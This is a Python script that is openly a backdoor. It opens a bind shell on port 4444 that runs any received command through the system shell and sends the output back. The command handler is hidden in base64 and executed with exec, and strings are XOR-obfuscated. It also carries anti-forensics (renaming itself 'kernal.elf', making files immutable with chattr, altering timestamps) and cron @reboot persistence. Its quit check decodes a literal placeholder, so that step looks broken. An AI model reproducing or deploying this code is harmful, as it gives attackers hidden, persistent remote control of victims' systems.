import os
import socket
import subprocess
import time
import base64
import zlib

# Advanced obfuscation for strings using XOR encryption
def xor_encrypt_decrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))

# XOR key for obfuscation
key = 'secret'

# Obfuscated strings (XOR encrypted and then base64 encoded)
encrypted_host = base64.b64encode(xor_encrypt_decrypt('0.0.0.0', key).encode()).decode()
encrypted_quit = base64.b64encode(xor_encrypt_decrypt('quit', key).encode()).decode()

# Function to decrypt strings dynamically
def decrypt_string(enc_string):
    return xor_encrypt_decrypt(base64.b64decode(enc_string).decode(), key)

# Decrypted at runtime
host = decrypt_string(encrypted_host)
port = 4444

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the host and port
s.bind((host, port))

# Listen for incoming connections
s.listen(1)
print(f"Backdoor created and listening on {host}:{port}")

# Anti-forensics
script_path = os.path.abspath(__file__)
os.system(f'mv "{script_path}" kernal.elf')
os.system('chattr +i *')

# Modify file timestamps to hide execution traces
for file in os.listdir():
    os.utime(file, (time.time(), time.time()))

# Persistence (Linux-based systems)
if os.name == 'posix':
    script_path = os.path.abspath(__file__)
    os.system(f'(crontab -l 2>/dev/null; echo "@reboot {script_path}") | crontab -')

# Corrected base64-encoded handle_connection function, which will be decoded at runtime
encoded_handle_connection = '''ZGVmIGhhbmRsZV9jb25uZWN0aW9uKGNsaWVudF9zb2NrZXQpOgogIHdoaWxlIFRydWU6CiAgICAgIGNvbW1hbmQgPSBjbGllbnRfc29ja2V0LnJlY3YoMTAyNCkuZGVjb2RlKCkKICAgICAgaWYgY29tbWFuZC5sb3dlcigpID09IGRlY3J5cHRfc3RyaW5nKCdlbmNyeXB0ZWRfcXVpdF9zdHJpbmcnKSk6CiAgICAgICAgICBjbGllbnRfc29ja2V0LmNsb3NlKCkKICAgICAgICAgIGJyZWFrCiAgICAgIG91dHB1dCA9IHN1YnByb2Nlc3MucnVuKGNvbW1hbmQsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUpCiAgICAgIGNsaWVudF9zb2NrZXQuc2VuZChvdXRwdXQuc3Rkb3V0KQo='''

# Create a dictionary to hold the namespace of the exec'd code
exec_namespace = {}

# Make sure decrypt_string and other necessary functions/variables are included in the exec namespace
exec_namespace['decrypt_string'] = decrypt_string
exec_namespace['key'] = key

# Decode and execute the handle_connection function dynamically, populating the exec_namespace
exec(base64.b64decode(encoded_handle_connection).decode(), exec_namespace)

# Main loop to accept and handle incoming connections
while True:
    client_socket, address = s.accept()
    print(f"Connection from {address}")
    exec_namespace['handle_connection'](client_socket)  # Call the decoded handle_connection function

# Close the backdoor socket (this will never be reached in normal operation)
s.close()
